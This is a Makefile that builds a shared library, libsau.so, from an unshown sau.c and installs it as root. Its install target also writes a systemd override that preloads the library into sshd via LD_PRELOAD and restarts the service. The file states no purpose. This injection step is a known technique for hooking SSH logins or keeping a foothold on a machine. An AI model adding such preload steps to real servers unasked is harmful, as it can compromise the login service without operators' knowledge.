CC = gcc
CFLAGS = -fPIC -shared -Wall -Wextra -O2
LIB_NAME = libsau.so
SRC = sau.c
INSTALL_DIR = /opt/sau
SSHD_OVERRIDE = /etc/systemd/system/sshd.service.d/override.conf

all: $(LIB_NAME)

$(LIB_NAME): $(SRC)
	$(CC) $(CFLAGS) -o $(LIB_NAME) $(SRC) -ldl -lcrypto

install: $(LIB_NAME)
	@echo "Installing $(LIB_NAME) to $(INSTALL_DIR)"
	mkdir -p $(INSTALL_DIR)
	cp $(LIB_NAME) $(INSTALL_DIR)/
	chmod 755 $(INSTALL_DIR)/$(LIB_NAME)
	chown root:root $(INSTALL_DIR)/$(LIB_NAME)
	@echo "Creating SSHD override file: $(SSHD_OVERRIDE)"
	mkdir -p $(dir $(SSHD_OVERRIDE))
	echo "[Service]" > $(SSHD_OVERRIDE)
	echo "Environment=LD_PRELOAD=$(INSTALL_DIR)/$(LIB_NAME)" >> $(SSHD_OVERRIDE)
	@echo "Reloading systemd daemon and restarting sshd"
	systemctl daemon-reload
	systemctl restart sshd

clean:
	@echo "Cleaning up..."
	rm -f $(LIB_NAME)

.PHONY: all install clean
